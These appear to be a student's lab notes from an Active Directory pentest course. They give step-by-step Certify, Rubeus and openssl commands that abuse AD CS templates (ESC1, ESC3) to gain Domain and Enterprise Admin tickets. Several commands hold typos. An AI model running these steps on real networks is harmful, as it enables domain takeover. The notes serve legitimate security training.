![Pasted image 20260224072047](assets/Pasted%20image%2020260224072047.png)
![Pasted image 20260224072424](assets/Pasted%20image%2020260224072424.png)


Can use [Certify](https://github.com/GhostPack/Certify) to enumerate AD CS in the target forest
`Certify.exe cas`

Enumerate all templates
`Certify.exe find`

Enumerate vulnerable templates
`Certify.exe find /vulnerable`
- shows any certificate where any user has enrollment rights
- pretty superficial, doesn't give you a lot of info
- will find ESC1 and ESC3 in the lab


Check ENROLLEE_SUPPLIES_SUBJECT (for ESC1)
- make sure to check enrollment rights
`Certify.exe find /enrolleeSuppliesSubject`
![Pasted image 20260318054042](assets/Pasted%20image%2020260318054042.png)
![Pasted image 20260318054133](assets/Pasted%20image%2020260318054133.png)


In order to abuse AD CS, you need the following access right when running `cas` flag
`Allow Enroll     NT AUTHORITY\Authenticated Users     S-1-5-11`
- can be any group in respect to lab/test, just need to see a user/group that you own
- will almost always be there since it would make the CA useless in prod if it wasn't


# ESC1

look for
`msPKI-Certificate-Name-Flag    : ENROLEE_SUPPLIES_SUBJECT`
`pkiextendedkeyusage           : Client Authentication`
- client authentication allows you to request a TGT 

##### Exploitation

template "HTTPSCertificates" has ENROLEE_SUPPLIES_SUBJECT value for msPKI-Certificates-Name-Flag
`Certify.exe find /enrolleeSuppliesSubject`

"HTTPSCertificates" allows enrollment to the RDPUsers group. request a certificate for DA (or EA) as studentx
`Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:administrator`

Convert from cert.pem to pfx and use it to request a TGT for DA (or EA)
`Rubeus.exe asktgt /user:administrator /certificate:esc1.pfx /password:SecretPass@123 /ptt`

check learning objective for intermittent steps such as converting pem to pfx

# ESC3

##### Escalation to DA
- request a certificate for Certificate Request Agent from "SmartCardEnrollment-Agent" template
`Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Agent`


- convert from cert.pem to pfx and use it to request a certificate on behalf of DA using "SmartCardEnrollment-Users" template
`Certify.exe request /ca:mcorp-dc.moneycorp.ocal\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:dcorp\administrator /enrollcert:esc3agent.pfx /enrollcertpw:SecretPass@123`

- Convert from cert.pem to pfx, request DA TGT and inject it
`Rubeus.exe asktgt /user:Administrator /certificate esc3user-DA.pfx /password:SecretPass@123 /ptt`

##### Escalate to DA:
- convert from cert.pem to pfx and use it to request a certificate on behalf of EA using "SmartCardEnrollment-Users" template
`Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:moneycorp.local\administrator /enrollcert:esc3agent.pfx /enrollcertpw:SecretPass@123`

- request EA TGT and inject it
`Rubeus.exe asktgt /user:moneycorp.local\administrator /certificate:esc3user.pfx /dc:mcorp-dc.moneycorp.local /password:SecretPass@123 /ptt`




# Learning Objective


### Check if AD CS is used by the target forest and find any vulnerable/abusable templates

`Certipy.exe find`
- look at ESC1 header for information about finding vulnerable/abusable templates



### Abuse template to get Domain Admin and Enterprise Admin

test enrollment rights for the target template
`Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:administrator`
- if it works you should get the certificate
![Pasted image 20260318054258](assets/Pasted%20image%2020260318054258.png)
![Pasted image 20260318054326](assets/Pasted%20image%2020260318054326.png)
- can see "the certificate has been issued" at the bottom
- copy output and save it to a file called "esc1.pem"

use openssl to convert the pem file to pfx
- it will ask for export password, which is the "SecretPass@123" seen earlier
`C:\AD\Tools\openssl\openssl.exe -kcs12 -in C:\AD\Tools\esc1.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc1-DA.pfx`
![Pasted image 20260318054624](assets/Pasted%20image%2020260318054624.png)
- "unable to write to random state" is fine to see


request the TGT for DA using Rubeus
`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:administrator /cerificate:C:\AD\Tools\esc1-DA.pfx /password:SecretPass@123 /ptt`
![Pasted image 20260318054801](assets/Pasted%20image%2020260318054801.png)
- can now access any resource in the domain


can also go for enterprise admin with a very similar process
- only difference is that you change the altname to the forest root's admin
`C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:moneycorp.local\administrator`
![Pasted image 20260318054946](assets/Pasted%20image%2020260318054946.png)
- save to a pem file, then convert just like with DA


convert to pfx using openssl
`C:\AD\Tools\openssl\openssl.exe -kcs12 -in C:\AD\Tools\esc1.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc1-EA.pfx`
- only difference is using esc1-EA.pfx instead of esc1-DA.pfx


request the TGT for EA
`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:moneycorplocal\Administrator /dc:mcorp-dc.moneycorp.local /cerificate:C:\AD\Tools\esc1-EA.pfx /password:SecretPass@123 /ptt`
- doing EA also requires the /domain flag to be filled out
- can now access forest root
![Pasted image 20260318055347](assets/Pasted%20image%2020260318055347.png)

